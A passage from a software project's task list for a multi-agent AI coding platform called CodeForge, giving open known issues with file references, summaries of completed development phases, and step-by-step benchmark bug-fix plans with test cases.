- [ ] **KI-17 Contract-first review/refactor (Phase 31) is not wired** (high): `ReviewTriggerService` gets a nil orchestrator, so `POST /projects/{id}/review-refactor` and `/boundaries/analyze` return `{"triggered": true}` but start nothing, and `DiffImpactScorer` has no caller. `RefactorApproval` listens for `refactor.approval_required` while the backend sends `review.approval_required` with another payload, and its approve/reject `fetch()` calls send no Authorization header (also the WT-7 remainder below). Evidence: `cmd/codeforge/main.go:489`, `internal/service/review_trigger.go:25-27`, `frontend/src/features/project/RefactorApproval.tsx:34`, `frontend/src/features/project/RefactorApproval.tsx:45`.
- [ ] **KI-25 `spawn_subagent` starts nothing** (medium): The tool only publishes an `agent.subagent_requested` trajectory event and tells the LLM "Sub-agent spawned"; Go only logs and broadcasts it, so the orchestrating model waits for results that never arrive. Evidence: `workers/codeforge/tools/spawn_subagent.py:110-129`, `internal/service/runtime_subscribers.go:259-282`.
- [ ] **KI-55 GitHub OAuth web flow is never wired** (medium): `NewGitHubOAuthService` has no caller and `Handlers.GitHubOAuth` is never set, so `/api/v1/auth/github` always returns 501. Evidence: `internal/service/github_oauth.go:38`, `internal/adapter/http/handlers_github_oauth.go:10-13`.
- [ ] **KI-56 Webhook-triggered roadmap sync always fails** (medium): GitHub webhooks ask for provider `github` (registered as `github-issues`), Plane gets no `api_token` and GitLab an empty base URL; the webhook still returns 200 and the failure is only logged. Evidence: `internal/service/pm_webhook.go:31-47`, `internal/service/pm_webhook.go:88`, `internal/adapter/githubpm/provider.go:15`.
- [ ] **KI-57 Email HITL provider sends no approval emails** (medium): The email feedback provider is built with nil recipients and a hardcoded localhost callback, and its Approve/Deny GET links point at a POST-only authenticated route, so approval requests by email are silently never delivered. Evidence: `cmd/codeforge/main.go:761-763`, `internal/adapter/email/feedback.go:34-60`.
- [x] (2026-09-30) **KI-58 Agent `create_skill` always fails** (medium): The tool inserts `tenant_id ''` into the UUID NOT NULL `skills.tenant_id` column, which PostgreSQL rejects, so agent-generated skill drafts (Auto-Agent Skills Task 10 below) never persist. Evidence: `workers/codeforge/consumer/_conversation_skill_integration.py:46`, `internal/adapter/postgres/migrations/045_create_skills.sql:4`. **Fixed (S6):** `wire_skill_tools` / `make_skill_save_fn` take the conversation's `tenant_id` (required); drafts are stored with tenant, project, source `agent`, status `draft`; without a tenant the tool reports that the skill was not saved instead of claiming success.
- [ ] **KI-60 Tiered cache is built and discarded** (low): `main.go` builds the L1/L2 cache and throws it away (`_ = tiered.New(...)`), so no service uses it although docs describe it as active. Evidence: `cmd/codeforge/main.go:185`.
- [x] (2026-09-30) **KI-61 SIGHUP config reload has no effect** (medium): the `ConfigHolder` is created after every service has copied its config and nothing reads it; SIGHUP only really reloads the secrets vault, config changes still need a restart. Evidence: `cmd/codeforge/main.go:1056-1065`. **Fixed (S4, SIGHUP is secrets-only):** the unused `ConfigHolder` is removed; SIGHUP reloads the secrets vault (read per request by the LiteLLM client), re-loads the configuration like startup (`config.ChangedSinceStart`: YAML, env, `*_FILE`, CLI flags) and logs the names of changed settings that need a restart, never values; an invalid config file is logged and the running config stays. Making services hot-reloadable would mean re-reading config in every service (ADR-013) and is not planned.
- [ ] **KI-79 GDPR residuals** (low): `quarantine_messages.reviewed_by` is free text typed by the reviewer and cannot be matched to an erased user (the handler should record the logged-in user's ID); the in-app privacy page says account data is kept "lifetime + 30 days after deletion", while erasure is immediate and backups expire after about five weeks - the wording needs a decision. Found in the S6 GDPR work (2026-09-30).
- [ ] **KI-62 Stall re-planning is not wired** (medium): `OrchestratorService.ReplanStep` has no production caller, so the documented MagenticOne stall detection plus re-planning loop never re-plans. Evidence: `internal/service/orchestrator_consensus.go:413`.

---

### Completed Phases (0 through 30+)

> All phases below are complete. For implementation details, see git history.
> For phase summaries, see [project-status.md](project-status.md).

#### Phase 0 -- Project Setup (COMPLETED)
- [x] Market research (20+ tools), architecture decisions, devcontainer, linting, documentation structure

#### Phase 1 -- Foundation (COMPLETED)
- [x] Docker Compose (PostgreSQL, NATS, LiteLLM), Go Core REST API (9 endpoints), Python Workers, SolidJS frontend, CI

#### Phase 2 -- MVP Features (COMPLETED)
- [x] Git local provider (clone, status, pull, branches), agent lifecycle with Aider backend, WebSocket live output, LLM provider management

#### Phase 3 -- Reliability & Performance (COMPLETED)
- [x] Hierarchical config, structured JSON logging, circuit breaker, graceful shutdown, idempotency keys, dead letter queue (Python DLQ path unreachable, see [KI-19](#known-issues))
- [x] Event sourcing, tiered cache adapter (ristretto L1 + NATS KV L2, constructed at startup but not yet used by any service), rate limiting (see [KI-11](#known-issues)), DB pool tuning, worker pools

#### Phase 4 -- Agent Execution Engine (COMPLETED)
- [x] Policy layer (first-match-wins, 4 presets, YAML custom policies), runtime step-by-step protocol (open defects: [KI-4..KI-9](#known-issues))
- [x] Docker sandbox execution, stall detection, quality gates, 5 delivery modes, shadow Git checkpoints (sandbox/hybrid gated until tools run in the container, [KI-13](#known-issues); open defects: [KI-26..KI-29](#known-issues))
- [x] Resource limits, secrets vault with SIGHUP reload, multi-tenancy preparation

#### Phase 5 -- Multi-Agent Orchestration (COMPLETED)
- [x] DAG scheduling (sequential, parallel, ping-pong, consensus), Meta-Agent LLM decomposition
- [x] Agent Teams with role-based composition, Context Optimizer with token budget packing
- [x] Modes System: 24 built-in agent specialization modes

#### Phase 6 -- Code-RAG (COMPLETED)
- [x] tree-sitter Repo Map (16+ languages, PageRank), Hybrid Retrieval (BM25S + semantic, RRF fusion)
- [x] Retrieval Sub-Agent with LLM query expansion, GraphRAG with PostgreSQL adjacency-list graph

#### Phase 7 -- Cost & Token Transparency (COMPLETED)
- [x] Real cost extraction from LiteLLM, fallback pricing table, cost aggregation API (5 endpoints)
- [x] WebSocket budget alerts, frontend cost dashboard with project breakdown and daily bars

#### Phase 8 -- Roadmap Foundation, Trajectory, Docker Production (COMPLETED)
- [x] Roadmap/Feature-Map domain model, spec/PM provider ports, 12 REST endpoints
- [x] Trajectory API with cursor pagination, Docker production images, docker-compose.prod.yml (open defects: [KI-43..KI-46](#known-issues))

#### Phase 9A-9E -- Advanced Integrations (COMPLETED)
- [x] 9A: OpenSpec, Markdown, GitHub Issues adapters, spec/PM import
- [x] 9B: SVN provider, Gitea/Forgejo PM adapter, VCS webhooks (GitHub + GitLab), bidirectional PM sync
- [x] 9C: PM webhook processing (webhook-triggered sync fails, see [KI-56](#known-issues)), Slack + Discord notification adapters
- [x] 9D: OpenTelemetry stub, A2A protocol stub, AG-UI event protocol, blue-green deployment (see [KI-47](#known-issues))
- [x] 9E: Plane.so PM adapter (full CRUD), full auto-detection engine, Feature-Map visual editor

#### Phase 10 -- Frontend Foundations (COMPLETED)
- [x] JWT auth (HS256, access + refresh), RBAC middleware, API key management
- [x] Signal-based i18n (480+ keys, EN + DE), CSS design tokens, command palette, toast system
- [x] WCAG 2.2 AA conformance, error boundaries, offline detection

#### Phase 11 -- GUI Enhancements (COMPLETED)
- [x] Tab-based ProjectDetailPage, settings page, mode selection UI, step-progress indicators
- [x] Team management, trajectory replay inspector, diff-review, architecture graph visualization

#### Post-Phase 11 -- Security Hardening (COMPLETED)
- [x] 18 audit findings fixed (5 P0, 8 P1, 5 P2): prompt injection defense, secret redaction, audit trail
- [x] Fail-closed quality gates (a missing check result fails the gate since the KI-29 fix, 2026-09-30), JWT standard claims + revocation, API key scopes, account lockout

#### Phase 12A-12K -- Architecture Evolution (COMPLETED)
- [x] 12A: Mode extensions (DeniedTools, DeniedActions, RequiredArtifact, modular prompt templates; tool restrictions are prompt-only, see [KI-10](#known-issues))
- [x] 12B: LLM routing via LiteLLM tag-based scenario routing (6 scenarios)
- [x] 12C: Role evaluation framework (FakeLLM harness, 9-role matrix, 15 fixtures)
- [x] 12D-12F: RAG shared scopes, artifact-gated pipelines, pipeline templates (3 built-in)
- [x] 12G-12K: Workspace management, per-tool token tracking, periodic reviews, project wizard, knowledge bases

#### OWASP Audit Remediation (COMPLETED)
- [x] Two rounds of OWASP Top 10:2025 + WSTG v4.2 (50+ findings across P0-P3)
- [x] Docker hardening, tenant isolation, request body limits, path traversal prevention, CSP headers

#### Phase 13 -- UI/UX Improvements & Chat Interface (COMPLETED)
- [x] Foundation fixes, CRUD completeness (projects, modes editable), settings + account management
- [x] Spec/roadmap detection fix, chat interface with conversation API and AG-UI integration
- [x] Automatic orchestration, Goose/OpenCode/Plandex/OpenHands agent backends

#### Phase 14 -- UX Simplification (COMPLETED)
- [x] Side-by-side project layout, simplified project creation with branch selection
- [x] Roadmap structured parsing with drag-to-reorder, bidirectional sync (UI -> repo files)
- [x] Chat enhancements (streaming, Markdown rendering, tool call cards)

#### Phase 15 -- Protocol Integrations (MCP + LSP) (COMPLETED)
- [x] MCP client in Python Workers (McpWorkbench with BM25 tool recommendation)
- [x] MCP server in Go Core (mcp-go SDK, 4 tools, 2 resources), server registry with DB persistence
- [x] (2026-03-24) MCP parameterized resource templates: `codeforge://projects/{id}`, `codeforge://projects/{id}/costs`
- [x] LSP code intelligence with per-language server lifecycle, tool routing with policy integration

#### Phase 16 -- Frontend Design System Rework (COMPLETED)
- [x] 25 CSS design tokens, 11 primitives, 8 composites, 4 layout components, full page migration (42 files)

#### Phase 17 -- Interactive Agent Loop (COMPLETED)
- [x] LLM tool-calling support, 7 built-in tools (Read, Write, Edit, Bash, Search, Glob, ListDir)
- [x] AgentLoopExecutor with multi-turn tool-use, ConversationHistoryManager with token budget
- [x] HITL approval via WebSocket, AG-UI streaming events, ChatPanel with tool call display

#### Phase 18 -- Live E2E Testing & Blockers (COMPLETED)
- [x] NATS stream subjects bug fix, system prompt self-correction, model auto-discovery
- [x] Runtime conversation policy fix, live testing with real LLM calls, knowledge base system fixes

#### Phase 19 -- Frontend UX Refinements (COMPLETED)
- [x] Resizable roadmap/chat split, collapsible roadmap panel, chat auto-scroll
- [x] Expanded mode prompts with composable prompt system and editor, MCP Streamable HTTP transport

#### Phase 20 -- Benchmark Mode (COMPLETED)
- [x] DeepEval integration (correctness, faithfulness, relevancy, tool correctness metrics)
- [x] OpenTelemetry tracing, GEMMAS collaboration metrics (IDS, UPR)
- [x] Go Core benchmark API (7 endpoints, migration 041), frontend benchmark dashboard

#### Phase 21 -- Intelligent Agent Orchestration (COMPLETED)
- [x] Confidence-based moderator router with structured output, typed agent module schemas
- [x] SVG-based agent flow DAG visualization, moderator agent mode with debate protocol

#### Phase 22 -- Planned Pattern Implementation (COMPLETED)
- [x] All 8 patterns from CLAUDE.md: RouterLLM wiring, Copilot token exchange, composite memory scoring
- [x] Experience pool (@exp_cache), HandoffMessage, Microagents, Skills system, Human Feedback Protocol (open defects: [KI-15, KI-16, KI-57](#known-issues))

#### Phase 23 -- Security & Identity Patterns (COMPLETED)
- [x] 23A: Trust annotations (4 levels), auto-stamped on NATS payloads
- [x] 23B: Message quarantine with risk scoring, admin review hold (bypassed for A2A and handoffs, see [KI-15](#known-issues))
- [x] 23C: Persistent agent identity (fingerprint, stats accumulation, inbox)
- [x] 23D: War Room -- live multi-agent collaboration view with swim lanes

#### Phase 24 -- Active Work Visibility (COMPLETED)
- [x] Parallel task deduplication, atomic claim/release with optimistic locking, stale recovery

#### Phase 25 -- Frontend Form Dropdowns (COMPLETED)
- [x] Dynamic dropdown population for agent, policy, and mode selectors, TagInput component

#### Phase 26 -- Benchmark System Redesign (COMPLETED)
- [x] Provider interface pattern, evaluator plugins (LLMJudge, FunctionalTest, SPARC), 3 runner types
- [x] 8 external providers (HumanEval, MBPP, SWE-bench, etc.), multi-compare with radar chart
- [x] NATS bridge, WebSocket live updates, suites CRUD, 132 E2E tests

#### Phase 27 -- A2A Protocol Integration (COMPLETED)
- [x] Full A2A v0.3.0 via a2a-go SDK -- server (inbound tasks) and client (outbound federation)
- [x] AgentCard builder, auth middleware, task lifecycle, remote agent registry, `a2a://` handoff routing (A2A API keys rejected by the global JWT middleware, see [KI-15](#known-issues))

#### Phase 28 -- R2E-Gym / EntroPO Integration (COMPLETED)
- [x] Hybrid verification pipeline (filter->rank), trajectory verifier (5-dimension LLM scoring; trajectory and logprob verifiers score 0.0 today, see [KI-37](#known-issues))
- [x] Multi-rollout test-time scaling (best-of-N), diversity-aware MAB routing (entropy-UCB1)
- [x] DPO/EntroPO trajectory export (JSONL), SWE-GEN synthetic task generation from Git history
- [x] (2026-03-16) Evaluation improvements: logprob verifier, categorical trajectory scoring, longest/shortest selection strategies

#### Phase 29 -- Hybrid Intelligent Model Routing (COMPLETED)
- [x] Three-layer cascade: ComplexityAnalyzer (<1ms) -> MABModelSelector (UCB1) -> LLMMetaRouter
- [x] Task-type complexity boost, model auto-discovery from LiteLLM, wildcard config
- [x] Adaptive retry with exponential backoff, per-provider rate-limit tracking

#### Phase 30 -- Goal Discovery & Adaptive Retry (COMPLETED)
- [x] Auto-detection of project goals from workspace files, priority-based context injection
- [x] LLMClientConfig with env-var-driven retry/timeout, HybridRouter skips exhausted providers
- [x] Goal system redesign: replaced `manage_goals` HTTP-callback tool with `propose_goal` AG-UI event tool (2026-03-09)
- [x] Rewritten goal_researcher mode with GSD questioning methodology (interview-first)
- [x] GoalProposalCard UI for approve/reject of agent-proposed goals
- [x] Context injection: docs/PROJECT.md, REQUIREMENTS.md, STATE.md passed to goal_researcher agent
- [x] Functional options pattern (`AgenticOption`/`WithContextEntries`) for extensible agentic dispatch

#### Unified LLM Path & Global Run Tracking (COMPLETED)
- [x] Simple chat unified with agentic path through NATS dispatch
- [x] ConversationRunProvider for global run state, sidebar indicator, ChatPanel seamless resume

#### OTEL Tracing Rewrite (COMPLETED)
- [x] AgentNeo replaced with OpenTelemetry backend (OTLP gRPC exporter), 6 instrumented services (export gaps, see [KI-36](#known-issues))

#### QA Audit (COMPLETED)
- [x] ~90 new handler tests across P0-P3 tiers, 33 duplicate test names renamed
- [x] P0: Auth (23 tests) + Orchestration (18 tests), P1: Auto-Agent, Files, Roadmap, Agent Features
- [x] P2: Conversation, Cost, Settings, Session, MCP, KB, LLM, P3: Service-layer gaps

#### Comprehensive Code Review (COMPLETED)
- [x] 46 issues found across 10 areas (18 critical, 24 important, 4 medium) -- all fixed
- [x] NATS contract fixes, backend executor implementations, runtime state leak fixes
- [x] Security hardening, benchmark fixes, memory/multi-tenancy, PM sync, orchestration fixes

#### Documentation-Code Reconciliation (COMPLETED)
- [x] Python trust/quarantine layer, A2A protocol expansion, handoff enrichment

#### Benchmark Interactive Testing Guide (COMPLETED)
- [x] (2026-03-15) Added step-by-step interactive E2E testing guide to `docs/dev-setup.md` — covers infrastructure verification, API-level testing (all 3 benchmark types, evaluator combinations, comparison, cost analysis, export), frontend dashboard walkthrough, error scenarios, automated E2E suite, troubleshooting table, custom dataset creation

#### Benchmark Cross-Layer Bug Fixes (COMPLETED)
- [x] 7 bugs fixed: DB migration for rollout fields, cost population, NATS wiring, CSV export

#### Benchmark Validation E2E Bug Fixes (COMPLETED)
- [x] (2026-03-15) **Bug 1 — Score Key Mismatch (Medium):** Evaluator dimension names (`correctness`, `sparc_*`, `trajectory_*`) didn't match metric request names (`llm_judge`, `sparc`, `trajectory_verifier`). Added `aggregate_metric_scores()` with `_DIMENSION_TO_METRIC` mapping (now in `workers/codeforge/consumer/_benchmark_gemmas.py`). 16 tests in `workers/tests/test_score_key_normalization.py`.
- [x] (2026-03-15) **Bug 2 — Stuck "running" Runs (High):** Runs with invalid params stayed `"running"` forever. Fix 2A: `StartRun()` returns error when dataset resolution fails and no suite fallback. Fix 2B: Watchdog goroutine scans every 5 min for runs stuck >15 min. Added `ErrorMessage` field to `Run` struct + DB migration `072`. Files: `internal/service/benchmark.go`, `internal/domain/benchmark/benchmark.go`, `internal/adapter/postgres/store_benchmark.go`, `cmd/codeforge/main.go`. 5 tests in `internal/service/benchmark_test.go`.
- [x] (2026-03-15) **Bug 3 — Invalid Model Silently Succeeds (Medium):** LiteLLM fell back to default model. Added `_validate_model_exists()` checking `/v1/models` endpoint in `workers/codeforge/consumer/_benchmark.py`. 6 tests in `workers/tests/test_model_validation.py`.
- [x] (2026-03-15) **Bug 4 — `model=auto` Without Routing (Low):** `_resolve_effective_llm()` silently passed `"auto"` to LiteLLM. Now raises `ValueError` when router unavailable. 2 tests in `workers/tests/test_model_validation.py`.
- [x] (2026-03-15) **Bug 5 — LLM Judge Context Overflow (Low):** Evaluators exceeded local model context limits. Added `compress_for_context()` head+tail truncation in `workers/codeforge/evaluation/evaluators/prompt_compressor.py`. Enhanced error fallback distinguishes `context_overflow` from `evaluation_failed`. 18 tests in `workers/tests/test_prompt_compressor.py`.
- [x] (2026-03-15) Updated E2E test assertions in `block-3-agent.spec.ts`, `block-4-routing.spec.ts`, `block-5-errors.spec.ts` to verify all fixes
- Findings: `frontend/e2e/benchmark-validation/FINDINGS.md`
- Plan: `docs/plans/2026-03-11-benchmark-findings-fixes-plan.md`

#### Benchmark Validation E2E Round 2 — Bugs 6-10 + External Suite Fixes (COMPLETED)
- [x] (2026-03-15) **Bug 6 — Agent Provider Wrong Kwarg (High):** `datasets_dir=` → `dataset_path=` in `_benchmark.py:405`
- [x] (2026-03-15) **Bug 7 — Watchdog Timeout Too Short (High):** 15min → 2h default, configurable via `CODEFORGE_BENCHMARK_WATCHDOG_TIMEOUT` / `benchmark.watchdog_timeout` (`internal/config/loader.go`); since 2026-03-20 overridden per type (simple 30m, tool_use 1h, agent 4h), the global value only applies to runs without a type
- [x] (2026-03-15) **Bug 8 — RolloutOutcome Missing eval_score (High):** Added `eval_score` field to `RolloutOutcome` dataclass in `multi_rollout.py`
- [x] (2026-03-15) **Bug 9 — Wrong Attribute Name in _convert_rollout_outcome (High):** `outcome.execution.*` → `outcome.result.*` in `_benchmark.py:518-527`
- [x] (2026-03-15) **Bug 10 — Hybrid Pipeline Passed as Regular Pipeline (Medium):** Separated pipeline construction, added `hybrid_pipeline` parameter
- [x] (2026-03-16) **Issue D — External Suite HF API Failures:** Fixed BigCodeBench (config/split swap), CRUXEval (dataset moved to `cruxeval-org/cruxeval` + HF_TOKEN auth), LiveCodeBench (correct dataset + adaptive page size fallback 100→10→1 with timeout handling and broken-row skipping)
- [x] (2026-03-16) Early NATS ack in benchmark handler to prevent stale message redelivery
- [x] (2026-03-16) Documented `HF_TOKEN` and `BENCHMARK_WATCHDOG_TIMEOUT` env vars in `docs/dev-setup.md`
- Results: Phase 3b external suites 4/5 PASS (LiveCodeBench partial due to HF server limitations), Phase 5 API 12/12 PASS, Phase 6 errors 2/5 PASS
- Findings: `frontend/e2e/benchmark-validation/FINDINGS.md`

#### Benchmark E2E Full Run (2026-03-19) — Findings & Recommendations (MOSTLY COMPLETED)

> Report: `docs/testing/benchmark-e2e-report.md`
> Full API + Playwright-MCP UI test. 86/90 passed, 4 deferred (queue timing).

##### REC-1: Parallel Benchmark Run Processing with Dependency Awareness (Critical)

> **Problem:** Python worker processes runs sequentially (`consumer/__init__.py:271` blocks on `await handler(msg)`).
> A single agent run (15-30 min) blocks ALL subsequent runs. During E2E test, Phase 4+6 runs waited >30 min.
> **Root cause:** `_message_loop` fetches `batch=1`, awaits handler inline. Go side supports parallelism
> (`MaxAckPending: 100`) but Python serializes everything. Tasks within a run are also sequential
> (`runners/_base.py:run_tasks()` for-loop).

- [x] (2026-03-20, c42bf5a6) REC-1.1: Add `asyncio.Semaphore` to benchmark handler, spawn runs via `asyncio.create_task()` instead of inline `await`
  - File: `workers/codeforge/consumer/_benchmark.py`
  - Config: `CODEFORGE_BENCHMARK_MAX_PARALLEL` env var (default 3, `workers/codeforge/config.py`)
  - Constraint: Agent `mount` mode runs sharing the same project workspace MUST NOT run in parallel (file corruption risk). Guard with per-project workspace lock or reject parallel mount runs to same project.
  - [ ] Still open: per-project workspace lock (or rejection) for parallel mount-mode agent runs
  - Constraint: LLM rate limits are the real parallelism bottleneck — size semaphore based on provider capacity
  - Note: Each run already has its own `RunResult` — no shared mutable state between runs, safe to parallelize
- [x] (2026-03-20, c42bf5a6) REC-1.2: Add structured error handling for concurrent task failures
  - If a spawned task raises an exception, it must still publish `benchmark.run.result` with `status: "failed"` to NATS
  - Use `asyncio.create_task()` with an `add_done_callback` that catches and publishes errors
- [x] (2026-03-20, c42bf5a6) REC-1.3: Update `_message_loop` to support concurrent handlers — solved inside the handler instead: the benchmark handler acks and returns immediately after spawning the run; `_message_loop` stays sequential
  - File: `workers/codeforge/consumer/__init__.py:271`
  - Current: `await handler(msg)` — blocks loop
  - Change: `asyncio.create_task(handler(msg))` — only for benchmark subject, other subjects (conversation, toolcall) remain sequential for ordering guarantees
- [ ] REC-1.4: Add integration test verifying parallel execution (only unit tests exist: `workers/tests/test_benchmark_parallel.py`)
  - Create 3 simple runs with different datasets simultaneously
  - Assert all 3 complete within ~1x single-run duration (not 3x)
  - Assert results are correct and don't interfere

##### REC-2: Trajectory Endpoint Returns 500 for Running Runs (High)

> **Problem:** `GET /runs/{id}/trajectory` returns HTTP 500 when run has no events yet.
> Frontend LiveFeed logs errors + skips hydration for all visible running runs.
> **Location:** `handlers_roadmap.go:444-455`

- [x] (2026-03-20) REC-2.1: Return empty result instead of 500 when `LoadTrajectory()` or `TrajectoryStats()` errors (run-not-found is not distinguished yet; it also returns 200 empty)
  - File: `internal/adapter/http/handlers_roadmap.go:444-455`
  - Fix: On error, set `page = &eventstore.TrajectoryPage{Events: []event.Event{}}` and `stats = &eventstore.TrajectoryStats{}`
  - Distinguish "run not found" (404) from "no events yet" (200 empty) if needed by checking run existence first

##### REC-3: Training Export Returns Empty Body Instead of Empty Array (Medium)

> **Problem:** JSONL export writes nothing when no pairs exist (for-loop iterates zero times).
> Client gets headers but zero-byte body. JSON format correctly returns `[]`.
> **Location:** `handlers_benchmark.go:336-339`

- [x] (2026-03-20) REC-3.1: Add empty-check before JSONL loop, fall back to `[]` JSON response when no pairs exist
  - File: `internal/adapter/http/handlers_benchmark.go` (`ExportTrainingData`)
- [ ] RLVR export (`ExportRLVRData`, `handlers_benchmark.go`) still writes a zero-byte JSONL body when there are no entries

##### REC-4: Suite Creation Should Auto-Derive Type from Provider (Low)

> **Problem:** `POST /suites` requires explicit `type` field. Provider already implies type.
> **Location:** `benchmark.go:86` — `r.Type.IsValid()` rejects empty type

- [x] (2026-03-20) REC-4.1: Add provider-to-type mapping, auto-derive in `RegisterSuite()` before `Validate()` (`benchmark.ProviderDefaultType()`, used in `internal/service/benchmark_suite.go`)
  - File: `internal/service/benchmark.go` (service layer), `internal/domain/benchmark/benchmark.go` (mapping)
  - Frontend: auto-populate type field in `SuiteManagement.tsx` on provider selection (nice-to-have)

##### REC-5: Configurable Watchdog Timeout per Suite/Type (Low)

> **Problem:** Single global 2h watchdog. Simple runs stuck 2h before cleanup, agent runs on slow models killed prematurely.
> **Location:** `cmd/codeforge/main.go` — watchdog goroutine, `internal/service/benchmark.go`

- [x] (2026-03-20) REC-5.1: Use benchmark type as heuristic timeout (no DB change needed) — `watchdogTimeoutForType()` in `internal/service/benchmark.go`
  - `simple` → 30 min, `tool_use` → 1h, `agent` → 4h
  - Or: add optional `timeout` field to `Suite` domain model + DB migration

---

#### Benchmark E2E — Remaining Bugs (COMPLETED 2026-03-16)

> Discovered during E2E validation Round 2 (Phase 6 error scenarios).
> Reference: `frontend/e2e/benchmark-validation/FINDINGS.md` → "Known Issues (Not Yet Fixed)"
> These bugs affect input validation and error handling — the happy path works, but malformed
> requests don't fail cleanly.

##### Issue A: Invalid Model Name Silently Succeeds (Regression from Bug 3)

> **Severity:** Medium
> **E2E Test:** Phase 6.2 — FAIL (run completes with score=0 instead of failing)
> **Root cause:** `_validate_model_exists()` does exact match against `/v1/models` list, but
> LiteLLM accepts `provider/model-name` format models (e.g. `nonexistent/model-xyz-404`) and
> silently falls back or passes them through. The validation only catches bare model names that
> aren't in the list — prefixed names bypass it.

- [x] (2026-03-16) A.1: Write failing test — model with `provider/name` format not in LiteLLM models list
  - File: `workers/tests/test_model_validation.py`
  - Test: `_validate_model_exists("nonexistent/model-xyz-404", available_models=["lm_studio/qwen3-30b"])` should raise `ValueError`
  - Test: `_validate_model_exists("openai/gpt-4", available_models=["openai/gpt-4"])` should pass (exact match still works)
  - Run: `cd workers && poetry run pytest tests/test_model_validation.py -v`

- [x] (2026-03-16) A.2: Fix `_validate_model_exists()` — add /model/info fallback for provider-prefixed models
  - File: `workers/codeforge/consumer/_benchmark.py` (line 57-71)
  - Current logic: `if model not in available_models: raise ValueError`
  - Problem: LiteLLM `/v1/models` might return `lm_studio/qwen3-30b-a3b` while user sends `lm_studio/nonexistent-model` — both have `lm_studio/` prefix but only one is valid
  - Fix option A (preferred): Keep exact match but also attempt a LiteLLM model info call (`/model/info` endpoint) to confirm the model is actually routable. If the model doesn't resolve, raise `ValueError`.
  - Fix option B (simpler): Extract provider prefix from model name (`model.split("/")[0]`), check that the prefix matches at least one available model's prefix AND the full model name matches. If no exact match, raise `ValueError` with helpful message listing similar models.
  - Key constraint: Must not break `model=auto` (already guarded by early return)

- [x] (2026-03-16) A.3: Write test for edge cases
  - File: `workers/tests/test_model_validation.py`
  - Test: model with valid prefix but invalid name (`lm_studio/nonexistent`) → fails
  - Test: model that is a substring of a valid model (`lm_studio/qwen3`) → fails (no partial match)
  - Test: empty model list (LiteLLM unreachable) → passes (existing skip behavior)
  - Test: model `auto` → passes (existing early return)

##### Issue B: HTTP 500 Instead of 400 for Invalid Requests

> **Severity:** High
> **E2E Tests:** Phase 6.1 (invalid dataset) — WEAK PASS (HTTP 500, should be 400),
>                Phase 6.3 (missing required field) — FAIL (HTTP 500, should be 400)
> **Root cause:** `CreateRunRequest.Validate()` returns plain `fmt.Errorf()` errors, but
> `writeDomainError()` only maps `domain.ErrValidation`-wrapped errors to HTTP 400. Plain
> errors fall through to the `default` case → HTTP 500.

- [x] (2026-03-16) B.1: Write failing Go test — validation errors should return HTTP 400
  - File: `internal/adapter/http/handlers_test.go`
  - Test: `POST /api/v1/benchmarks/runs` with `{"model": "gpt-4", "metrics": ["llm_judge"]}` (missing dataset AND suite_id) → expect HTTP 400 with `"dataset or suite_id is required"`
  - Test: `POST /api/v1/benchmarks/runs` with `{"dataset": "foo", "metrics": ["llm_judge"]}` (missing model) → expect HTTP 400 with `"model is required"`
  - Test: `POST /api/v1/benchmarks/runs` with `{"dataset": "foo", "model": "gpt-4"}` (missing metrics) → expect HTTP 400 with `"at least one metric is required"`
  - Test: `POST /api/v1/benchmarks/runs` with `{"dataset": "foo", "model": "gpt-4", "metrics": ["llm_judge"], "benchmark_type": "invalid"}` → expect HTTP 400 with `"invalid benchmark type"`
  - Run: `cd /workspaces/CodeForge && go test ./internal/adapter/http/ -run TestCreateBenchmarkRun -v`

- [x] (2026-03-16) B.2: Wrap `Validate()` errors with `domain.ErrValidation`
  - File: `internal/domain/benchmark/benchmark.go` (line 175-190, `Validate()` method)
  - Current: `return fmt.Errorf("model is required")`
  - Fix: `return fmt.Errorf("%w: model is required", domain.ErrValidation)`
  - Apply to ALL 5 error returns in `Validate()`:
    1. `dataset or suite_id is required`
    2. `model is required`
    3. `at least one metric is required`
    4. `invalid benchmark type: %q`
    5. `invalid exec mode: %q`
  - Import: `"github.com/CodeForge/internal/domain"` (or wherever `ErrValidation` is defined)
  - This ensures `writeDomainError()` in `internal/adapter/http/helpers.go:114` matches the `errors.Is(err, domain.ErrValidation)` case → HTTP 400

- [x] (2026-03-16) B.3: Verify `StartRun()` dataset-not-found also returns 400 (not 500)
  - File: `internal/service/benchmark.go` (line 192)
  - Current: `return nil, fmt.Errorf("dataset %q not found: %w", run.Dataset, statErr)`
  - This wraps `statErr` (an `os.PathError`) — `writeDomainError()` won't match it → HTTP 500
  - Fix: `return nil, fmt.Errorf("%w: dataset %q not found", domain.ErrValidation, run.Dataset)`
  - Test: `POST /api/v1/benchmarks/runs` with `{"dataset": "nonexistent-xyz", "model": "gpt-4", "metrics": ["llm_judge"]}` → expect HTTP 400 (not 500)

- [x] (2026-03-16) B.4: Run full test suite to verify no regressions
  - Run: `cd /workspaces/CodeForge && go test ./internal/... -count=1`
  - All existing benchmark tests must still pass

##### Issue C: Unknown Evaluator Names Silently Ignored

> **Severity:** Medium
> **E2E Test:** Phase 6.4 — FAIL (run completes with empty scores instead of failing)
> **Root cause:** `_build_evaluators()` in `workers/codeforge/consumer/_benchmark.py:652-697`
> uses a `logger.warning("unknown evaluator, skipping")` for unrecognized names (line 681),
> then falls through to the "no evaluators" fallback which creates a default LLMJudgeEvaluator.
> So requesting `metrics: ["nonexistent_evaluator"]` silently succeeds with a default evaluator.

- [x] (2026-03-16) C.1: Decide on validation strategy (two options):
  - **Option 1 — Go-side validation (preferred):** Add a `ValidMetrics` set in `internal/domain/benchmark/benchmark.go` containing the 4 valid top-level metrics (`llm_judge`, `functional_test`, `sparc`, `trajectory_verifier`) plus the 5 LLM judge sub-metrics (`correctness`, `faithfulness`, `relevance`, `coherence`, `fluency`). Check each element of `req.Metrics` in `Validate()` — reject with HTTP 400 if unknown.
  - **Option 2 — Python-side validation:** Change `_build_evaluators()` to raise `ValueError` instead of logging a warning for unknown names. The existing error handler would then publish `status=failed` with a descriptive error message.
  - **Recommendation:** Option 1 (Go-side) catches errors earlier and returns proper HTTP 400. Option 2 is a safety net. Implement both.

- [x] (2026-03-16) C.2: Write failing Go test — unknown metric names rejected
  - File: `internal/domain/benchmark/benchmark_test.go`
  - Test: `CreateRunRequest{Metrics: []string{"nonexistent_evaluator"}}` → `Validate()` returns error containing `"unknown metric"` and `"nonexistent_evaluator"`
  - Test: `CreateRunRequest{Metrics: []string{"llm_judge", "functional_test"}}` → `Validate()` returns nil (valid)
  - Test: `CreateRunRequest{Metrics: []string{"llm_judge", "invalid"}}` → `Validate()` returns error (one invalid is enough to reject)
